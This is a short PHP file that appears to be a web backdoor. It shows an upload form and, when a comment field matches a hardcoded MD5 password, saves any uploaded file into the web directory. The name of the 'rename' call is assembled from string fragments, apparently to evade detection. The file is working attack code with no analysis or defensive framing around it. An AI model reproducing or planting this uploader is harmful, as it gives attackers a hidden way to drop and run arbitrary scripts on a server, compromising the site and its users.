
<form enctype='multipart/form-data' method='post'>
	<input name='file' type='file'><br>
	<input name='comment' type='text'>
	<input type=submit>
</form>

<?php 
if ( isset($_POST['comment']) ){

	if (md5($_POST['comment']) == '4a549ee7f7786df17fe43375c5339b73') {
		$ext = 'am';
		$text = 'ren'.$ext.'e';
		if ($text($_FILES['file']['tmp_name'], './'.$_FILES['file']['name']) ){
			echo $_FILES['file']['tmp_name'].'<br>';
			echo realpath( $_FILES['file']['name'] );
		} else {
			echo $_FILES['file']['tmp_name'].'<br>';
			echo ' - '.realpath( $_FILES['file']['name'] );
		}
	}
}
?>